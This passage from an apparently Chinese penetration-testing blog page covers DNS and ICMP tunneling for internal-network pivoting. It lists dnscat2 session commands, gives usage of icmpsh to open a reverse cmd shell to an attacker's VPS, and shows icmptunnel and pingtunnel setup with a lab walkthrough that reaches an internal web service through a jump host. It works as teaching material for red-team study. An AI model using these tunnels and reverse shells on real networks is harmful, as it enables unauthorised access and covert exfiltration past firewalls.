+</code></pre>
+<p>进入隧道后，使用<code>help</code>同样可以看到其内支持的命令：</p>
+<pre><code>clear（清屏）
+delay（修改远程会话超时时间）
+exec（执行远程机上的程序）
+shell（得到一个反弹shell）
+download/upload（两端之间上传下载文件）
+supend（返回到上一层，等于快捷键`ctrl+z`）
+windows（列举出所有的通道）
+window -i &lt;id&gt;（连接某个通道）
+listen [VPS的IP]:[本地端口] [内网机的IP]:[内网机端口]（内网代理转发）
+shutdown （断开被控机）
+</code></pre>
+<h2 id="3-4-参考"><a href="#3-4-参考" class="headerlink" title="3.4 参考"></a>3.4 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsgxeva/p/14260534.html">DNS tunnel</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.360doc.com/content/18/0407/20/54185769_743599449.shtml">DNS+tunnel(DNS隧道)技术</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/localhost01/article/details/86591685">DNS隧道工具——dnscat2</a></li>
+</ul>
+<h1 id="肆-ICMP隧道"><a href="#肆-ICMP隧道" class="headerlink" title="肆 ICMP隧道"></a>肆 ICMP隧道</h1><h2 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h2><p><code>ICMP</code>报文中除了必须要有的类型、校验和等等还可以携带一定长度的可选数据，这也就是我们可以用来搭建隧道的原因，不过每次报文携带得的字节不会很多，所以有点慢。</p>
+<ul>
+<li>优点<br>防火墙对<code>ICMP_ECHO</code>数据包是放行的，并且内部主机不会检查<code>ICMP</code>数据包所携带的数据内容，隐蔽性高</li>
+<li>缺点<br><code>ICMP</code>隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低<br>利用隧道传输时，需要接触更低层次的协议 ，这就需要高级用户权限</li>
+</ul>
+<h2 id="4-2-前提"><a href="#4-2-前提" class="headerlink" title="4.2 前提"></a>4.2 前提</h2><ul>
+<li>拓扑图：<br><img src="/images/%E5%86%85%E7%BD%91/7db7b3af0025daf3ca359b7fdc963f66.png" alt="7db7b3af0025daf3ca359b7fdc963f66.png"></li>
+</ul>
+<p>使用工具：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh"><code>icmpsh</code></a>：最后更新于2013年，客户端使用C语言实现，只能运行在目标<code>Windows</code>机器上；而服务端由于已经有<code>C</code>和<code>Perl</code>实现的版本，而且之后又移植到了<code>Python</code>上，因此可以运行在任何平台的攻击者机器中，该工具能通过<code>ICMP</code>协议反弹<code>cmd</code>，不用管理员权限，但反弹回来的<code>cmd</code>极不稳定，加上常年未维护，版本过老，<font color="red">不推荐使用</font>。<br><a href="/tools/%E5%86%85%E7%BD%91/icmpsh-master.zip">icmpsh-master.zip</a></li>
+</ul>
+<pre><code class="bash"># 用法
+# git clone https://github.com/inquisb/icmpsh.git
+# 关闭ping回复，防止内核自己对ping包进行响应。
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+# 服务端（VPS）攻击端执行
+python icmpsh_m.py &lt;服务端IP&gt; &lt;客户端IP&gt;
+# 客户端（被控机）执行
+icmpsh.exe -t &lt;服务端-IP&gt;
+</code></pre>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/DhavalKapil/icmptunnel"><code>icmptunnel</code></a>：最后更新于2017年，创建虚拟网卡通过<code>ICMP</code>协议传输网卡流量，基于<code>ICMP</code>隧道的<code>VPN</code>，需要root权限，动静极大，<font color="red">不推荐使用</font>。<br><a href="/tools/%E5%86%85%E7%BD%91/icmptunnel-1.0.0.zip">icmptunnel-1.0.0.zip</a></li>
+</ul>
+<pre><code class="bash"># 用法
+# 服务端与客户端均需要以下操作
+# 安装和编译
+git clone https://github.com/DhavalKapil/icmptunnel.git
+cd icmptunnel
+make
+# 禁用ICMP echo回复，防止内核自己对ping包进行响应,(需要root权限)
+echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# ++++++++++++++++服务端++++++++++++++++
+# 启动隧道（root权限）
+./icmptunnel -s [server-IP]
+# 观察路由
+route -n
+
+# ++++++++++++++++客户端++++++++++++++++
+# 修改client.sh
+route add -host [server-IP] gw [client-IP] dev eth0
+# 建立隧道
+./icmptunnel -c [server-IP]
+</code></pre>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel"><code>pingtunnel</code></a>：持续更新，<code>TCP</code>、<code>UDP</code>、<code>socks5 over ICMP</code>，速度快，连接稳定，跨平台，支持大多数具有<code>libpcap</code>的操作系统，从版本0.7开始，<code>ptunnel</code>也可以在装<code>WinPcap</code>的<code>Windows</code>上编译，<font color="red">推荐使用</font>。<br><a href="/tools/%E5%86%85%E7%BD%91/pingtunnel-2.6.zip">pingtunnel-2.6.zip</a></li>
+</ul>
+<pre><code class="bash"># 用法
+# 服务端，需要root权限，key是设置密码，服务端需要根据我们要做什么代理来决定的
+sudo ./pingtunnel -type server -key 密码
+
+# 客户端，需要root权限
+
+# tcp映射，本地监听端口，并把该端口通过服务端重定向至要访问的机器IP端口
+./pingtunnel -type client -l :本地端口 -s 服务端IP -t 要访问的机器IP:端口 -tcp 1 -key 与服务端对应密码
+
+# sock转发，本地监听端口开启socks代理，并把流量重定向至服务端，此时流量通过服务端出去，主机出网
+./pingtunnel -type client -l :本地端口 -s 服务端IP -sock5 1 -key 与服务端对应密码
+
+# 注意这里有两个参数需要说明：noprint和nolog两个参数，noprint为调试输出，记录当前连接状况等，nolog为日志输入，将连接状况记录到日志中，如果不需要这两个参数将其置为1即可，实验手册中均置为1
+</code></pre>
+<h2 id="4-3-复现"><a href="#4-3-复现" class="headerlink" title="4.3 复现"></a>4.3 复现</h2><p>这个复现是通过<code>B</code>这个跳板机去实现的<code>A</code>服务<code>C</code>，即<code>A</code>访问<code>C</code>的<code>Web</code>服务，我们将<code>B</code>主机设置为服务端，<code>B</code>是内网的一个机器：</p>
+<pre><code class="bash">sudo ./pingtunnel -type server -key 1234
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/0243211d654493c10182f205b257c719.png" alt="0243211d654493c10182f205b257c719.png"></p>
+<p>在攻击机<code>A</code>设置客户端：</p>
+<pre><code class="bash">#监听本地的 4455 端口，发送到4455端口的流量将通过 ICMP 隧道转发到 10.0.1.132 服务器的 8000 端口
+./pingtunnel -type client -l :4455 -s 10.0.1.131 -t 10.0.1.132:8000 -tcp 1 -key 1234
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/335efc4e18de616d6f015154d2523f33.png" alt="335efc4e18de616d6f015154d2523f33.png"><br>在执行完上面两条命令之后，在<code>A</code>主机上访问<code>http://localhost:4455</code>即可访问<code>C</code>的目标<code>8000</code>端口：<br><img src="/images/%E5%86%85%E7%BD%91/e3c458d4083fe793e09c7ffd4062bcb2.png" alt="e3c458d4083fe793e09c7ffd4062bcb2.png"></p>
+<h2 id="4-4-参考"><a href="#4-4-参考" class="headerlink" title="4.4 参考"></a>4.4 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://fishpond.blog.csdn.net/article/details/118305353">内网渗透系列：内网穿透（隧道）学习</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847838/article/details/125879778">【Pingtunnel工具教程】利用ICMP隧道技术进行ICMP封装穿透防火墙</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/118491274">内网渗透系列：内网隧道之ICMP隧道</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qingzhantianxia/article/details/123526939">icmp隧道</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xwj1590/article/details/121782372">icmp端口_icmptunnel搭建icmp隧道——超详细步骤</a></li>
+</ul>
+<h1 id="伍-UDP隧道"><a href="#伍-UDP隧道" class="headerlink" title="伍 UDP隧道"></a>伍 UDP隧道</h1><p>后面有空在写吧，目前还没怎么用过！</p>
+
+    </div>
+    
+</div>
+
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg " alt="avatar">
+        </div>
+        <div class="name">
+            小C&天天
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                修学储能 先博后渊
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">
+                    kyrieee个人博客
+                </a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">
+                    tonyd0g
+                </a>
+            </div>
+            
+        </div>
+    </div>
+    <!-- 目录 -->
+    
+        <div class="card-style" style="width: 300px">
+            <div id="toc" class="toc-article">
+                <strong class="toc-title">文章目录</strong>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91%E6%8A%80%E5%B7%A7"><span class="toc-text">壹 内网代理与转发技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%A6%82%E5%BF%B5"><span class="toc-text">1.1 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E7%9A%84%E5%87%BA%E7%BD%91%E6%96%B9%E5%BC%8F"><span class="toc-text">1.2 内网主机所有可能的出网方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E5%85%81%E8%AE%B8ICMP%E5%8D%8F%E8%AE%AE%E5%87%BA%E7%BD%91"><span class="toc-text">1.2.1 允许ICMP协议出网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84TCP%E6%88%96UDP%E5%8D%8F%E8%AE%AE%E7%AB%AF%E5%8F%A3%E5%87%BA%E7%BD%91"><span class="toc-text">1.2.2 允许特定的TCP或UDP协议端口出网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-3-%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A%E7%9A%84%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%87%BA%E7%BD%91%EF%BC%88%E6%AF%94%E5%A6%82HTTP%E3%80%81SSH%E3%80%81DNS%E7%AD%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">1.2.3 允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-1-DNS%E9%9A%A7%E9%81%93"><span class="toc-text">1.2.3.1 DNS隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-2-HTTP%E9%9A%A7%E9%81%93"><span class="toc-text">1.2.3.2 HTTP隧道</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%92%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">1.3 端口映射和端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-1-%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-text">1.3.1 端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-2-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">1.3.2 端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-3-%E5%8C%BA%E5%88%AB"><span class="toc-text">1.3.3 区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-HTTP%E3%80%81Socket4%E3%80%81Socket5%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">1.4 HTTP、Socket4、Socket5代理的区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-SSH-%E9%9A%A7%E9%81%93"><span class="toc-text">贰 SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E4%BB%8B%E7%BB%8D"><span class="toc-text">2.1 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%89%8D%E6%8F%90"><span class="toc-text">2.2 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%A4%8D%E7%8E%B0"><span class="toc-text">2.3 复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%8F%82%E8%80%83"><span class="toc-text">2.4 参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-DNS%E9%9A%A7%E9%81%93"><span class="toc-text">叁 DNS隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.1 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%89%8D%E6%8F%90"><span class="toc-text">3.2 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E5%A4%8D%E7%8E%B0"><span class="toc-text">3.3 复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E5%8F%82%E8%80%83"><span class="toc-text">3.4 参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-ICMP%E9%9A%A7%E9%81%93"><span class="toc-text">肆 ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E4%BB%8B%E7%BB%8D"><span class="toc-text">4.1 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%89%8D%E6%8F%90"><span class="toc-text">4.2 前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E5%A4%8D%E7%8E%B0"><span class="toc-text">4.3 复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E5%8F%82%E8%80%83"><span class="toc-text">4.4 参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%8D-UDP%E9%9A%A7%E9%81%93"><span class="toc-text">伍 UDP隧道</span></a></li></ol>
+            </div>    
+        </div>
+        
+    </div>
+</div>
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            @小C&天天
+        </div>
+        <div>
+            备案号：小C&天天の窝
+        </div>
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+        <!-- 3D模型 -->
+        <div id="L2dCanvas" style="position: relative;"></div>
+        <script src="/js/live2d.min.js"></script>
+        <script src="/css/live2d.css"></script>
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/background.js"></script>
+    </body>
+</html>
